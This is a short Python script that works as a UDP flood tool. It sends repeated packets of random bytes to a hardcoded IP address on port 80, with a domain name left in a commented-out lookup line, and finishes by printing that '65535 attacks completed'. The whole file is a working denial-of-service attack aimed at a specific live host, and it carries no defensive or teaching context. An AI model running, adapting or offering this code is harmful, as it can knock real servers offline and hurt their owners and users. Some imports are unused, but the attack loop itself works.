# Import.
from datetime import timedelta
from   platform import system
from   tqdm.auto import tqdm
import os
import time
import random
import socket
import pyfiglet
import datetime

# Socket
sock  = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

# Get ip.
url = "fwe22.top"
#ip = socket.gethostbyname(url)
ip = "103.215.51.92"

# Value.
sent = 1
i = 1
port = 80

#ululu alala
if i == 1:
    try:
        while True:
            if i == 65535:
                exit()

            sock.sendto(bytes, (str(ip), port))
            sent += 1
            i += 1
            now = datetime.datetime.now()
            dtime = now.strftime("%Y-%m-%d %H:%M:%S")
            
    except:
        print('65535 attacks completed, Exited')
